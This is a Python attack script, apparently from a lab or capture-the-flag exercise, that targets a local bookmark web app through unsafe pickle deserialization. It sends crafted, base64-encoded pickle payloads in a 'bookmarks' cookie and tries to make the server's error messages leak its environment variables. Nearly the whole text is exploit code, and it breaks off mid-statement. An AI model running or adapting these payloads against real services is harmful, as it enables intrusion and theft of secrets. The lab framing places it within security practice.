import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# Let me try returning a list with malicious content
# The bookmark app expects a list of URLs, let's try a list that causes issues

class PayloadList:
    def __reduce__(self):
        # Return a list that when iterated causes issues
        return (list, ([1, 2, 3, "malicious"],))

pickled = pickle.dumps(PayloadList(), protocol=4)
encoded = base64.b64encode(pickled).decode()
print(f"[*] List payload: {encoded}")

response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers)
print(f"[*] Status: {response.status_code}")
print(f"[*] Response preview: {response.text[:500]}")

# Try with nested objects that execute code when accessed
class EvilObject:
    def __init__(self):
        self.data = "evil"
    
    def __getitem__(self, key):
        import os
        raise ValueError(f"ENV: {dict(os.environ)}")
    
    def __iter__(self):
        import os
        raise ValueError(f"ENV_ITER: {dict(os.environ)}")
    
    def __len__(self):
        import os
        raise ValueError(f"ENV_LEN: {dict(os.environ)}")

# Test if the list is iterated
class PayloadEvilList:
    def __reduce__(self):
        return (list, ([EvilObject()],))

try:
    pickled = pickle.dumps(PayloadEvilList(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"\n[*] EvilObject list payload: {encoded}")

    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers)
    print(f"[*] Status: {response.status_code}")
    if response.status_code == 500:
        print(f"[!] 500 ERROR!")
        print(response.text[:2000])
except Exception as e:
    print(f"[*] Error: {e}")

# Try with __class__ modification
print("\n\n[*] Trying more approaches...")

class PayloadCallable:
    def __call__(self):
        import os
        raise ValueError(f"CALLABLE_ENV: {dict(os.environ)}")
    
    def __reduce__(self):
        return (PayloadCallable, ())

try:
    pickled = pickle.dumps(PayloadCallable(), protocol=4)
